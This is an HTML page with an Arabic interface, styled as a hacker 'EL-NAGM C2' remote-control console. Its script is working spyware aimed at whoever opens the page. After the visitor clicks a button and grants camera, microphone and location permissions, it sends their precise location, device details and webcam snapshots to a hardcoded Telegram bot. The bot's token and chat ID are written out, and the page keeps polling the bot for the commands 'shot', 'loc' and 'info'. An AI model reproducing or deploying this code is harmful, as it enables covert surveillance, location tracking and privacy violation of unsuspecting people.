<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>EL-NAGM C2 | نظام التحكم عن بعد</title>
    <style>
        :root { --neon: #00ff41; --danger: #ff003c; }
        body { background: #000; color: var(--neon); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        .grid { display: grid; grid-template-rows: 50px 1fr 100px; height: 100vh; padding: 10px; gap: 10px; }
        .panel { border: 1px solid var(--neon); padding: 15px; background: rgba(0,20,0,0.9); position: relative; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--neon); }
        .blink { animation: blink 1s infinite; color: var(--danger); font-weight: bold; }
        @keyframes blink { 50% { opacity: 0; } }
        button { width: 100%; padding: 20px; background: var(--neon); color: #000; font-weight: bold; border: none; cursor: pointer; font-size: 1.3rem; transition: 0.3s; }
        button:hover { background: #fff; box-shadow: 0 0 20px var(--neon); }
        #terminal { font-size: 11px; height: 100%; overflow: hidden; line-height: 1.5; }
    </style>
</head>
<body>

<div class="grid">
    <div class="panel header">
        <span>[ نظام السيطرة: EL-NAGM C2 ]</span>
        <span id="sync-status" class="blink">OFFLINE_AWAITING_IGNITION</span>
    </div>

    <div class="panel">
        <div id="terminal">
            > جاري تهيئة بروتوكولات الاتصال...<br>
            > انتظار تفعيل "إطلاق القمر الصناعي" للبدء...<br>
        </div>
    </div>

    <div class="panel">
        <button onclick="igniteRemoteSystem()">إطلاق السيطرة الشاملة (Remote Control)</button>
    </div>
</div>

<video id="v" autoplay playsinline muted style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
    const chatId = "8754338811";
    let lastUpdateId = 0;

    // دالة التواصل مع التليجرام
    async function botApi(method, params = {}, isFile = false) {
        let url = `https://api.telegram.org/bot${token}/${method}`;
        const fd = new FormData();
        fd.append('chat_id', chatId);
        for (let key in params) fd.append(key, params[key]);
        try {
            const r = await fetch(url, { method: 'POST', body: fd });
            return await r.json();
        } catch(e) { return null; }
    }

    // 1. أوامر التحكم (Actions)
    async function takeLiveShot() {
        const canvas = document.getElementById('c');
        const video = document.getElementById('v');
        canvas.width = 640; canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        canvas.toBlob(blob => botApi('sendPhoto', { photo: blob, caption: "✅ تم التقاط صورة حية" }), 'image/jpeg');
    }

    async function pushLocation() {
        navigator.geolocation.getCurrentPosition(p => {
            botApi('sendMessage', { text: `📍 الموقع المحدث:\nhttp://googleusercontent.com/maps.google.com/7{p.coords.latitude},${p.coords.longitude}` });
        }, null, {enableHighAccuracy: true});
    }

    async function sendDeviceInfo() {
        const info = `📱 *حالة الجهاز المستهدف:*\n- النظام: ${navigator.platform}\n- الذاكرة: ${navigator.deviceMemory || 'N/A'} GB\n- المتصفح: ${navigator.userAgent.split(' ')[0]}`;
        botApi('sendMessage', { text: info, parse_mode: 'Markdown' });
    }

    // 2. محرك الاستماع للأوامر (C2 Listener)
    async function startListening() {
        setInterval(async () => {
            const updates = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`).then(r => r.json());
            if (updates.result && updates.result.length > 0) {
                const latest = updates.result[0].message;
                if (latest.message_id !== lastUpdateId) {
                    lastUpdateId = latest.message_id;
                    const command = latest.text.toLowerCase();

                    log(`[!] تم استلام أمر: ${command}`);

                    if (command === 'shot') { await takeLiveShot(); }
                    else if (command === 'loc') { await pushLocation(); }
                    else if (command === 'info') { await sendDeviceInfo(); }
                    else if (command === 'ping') { botApi('sendMessage', { text: "Online 🟢" }); }
                }
            }
        }, 3500); // يفحص كل 3.5 ثانية
    }

    // 3. تفعيل النظام
    async function igniteRemoteSystem() {
        log("> جاري طلب الصلاحيات السيادية...");
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode: "user"}, audio: true });
            document.getElementById('v').srcObject = stream;
            
            log("> تم الاتصال بالقمر الصناعي بنجاح.");
            document.getElementById('sync-status').innerText = "ONLINE - LISTENING FOR CMDS";
            document.getElementById('sync-status').classList.remove('blink');
            document.getElementById('sync-status').style.color = "var(--neon)";

            botApi('sendMessage', { text: "✅ *نظام التحكم متصل!*\nأرسل أحد الأوامر التالية:\n- `shot` : صورة سيلفي\n- `loc` : الموقع المباشر\n- `info` : مواصفات الجهاز\n- `ping` : فحص الاتصال" });
            
            // سحب أولي
            pushLocation();
            startListening();
        } catch (e) {
            alert("⚠️ خطأ: يجب السماح بجميع الصلاحيات لتفعيل نظام السيطرة عن بعد.");
        }
    }

    function log(msg) {
        const t = document.getElementById('terminal');
        t.innerHTML += `> ${msg}<br>`;
        if(t.innerHTML.length > 1500) t.innerHTML = "";
    }
</script>

</body>
</html>
